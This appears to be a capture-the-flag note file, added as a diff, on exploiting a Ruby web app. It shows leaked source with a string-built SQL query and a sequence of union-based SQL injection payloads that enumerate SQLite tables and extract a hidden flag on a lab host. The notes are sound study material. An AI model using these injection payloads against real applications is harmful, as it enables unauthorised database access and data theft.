@@ -1,0 +1,40 @@
+# Target
+9001/tcp open  http        Thin httpd
+
+# Post list, trigger error panel
+search[]=a
+
+
+SQLite3
+/2_of_spades/app/controllers/application_controller.rb in block in <class:ApplicationController>
+```
+@search_term = params[:search] || ''
+    sql = "SELECT * FROM reviews WHERE title LIKE '%#{@search_term}%'"
+    @sql_result = ActiveRecord::Base.connection.execute(sql)
+    @result = []
+    @sql_result.each do |review|
+      @result.append(Review.new(title: review[1], comment: review[2]))
+    end
+    erb :'/search'
+  end
+end
+```
+
+# SQL Injection
+' union select 1,2,3-- -
+Game Title	Review
+2	3
+League of Legends	9/10
+Destiny 2	7/10
+Overwatch	8/10
+
+' union select 1,name,3 FROM sqlite_master WHERE type='table'-- -
+	schema_migrations,sqlite_sequence,hidden,reviews	
+
+' union select 1,sql,3 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='hidden'-- -
+	CREATE TABLE "hidden" ("id" INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, "flag" varchar, "link" varchar)
+
+' union select 1,flag,link FROM hidden-- -
+	2_of_spades	/eGHaMBu2XWvRA5cu/2_of_spades.png
+
+http://172.15.27.21:9001/eGHaMBu2XWvRA5cu/2_of_spades.png
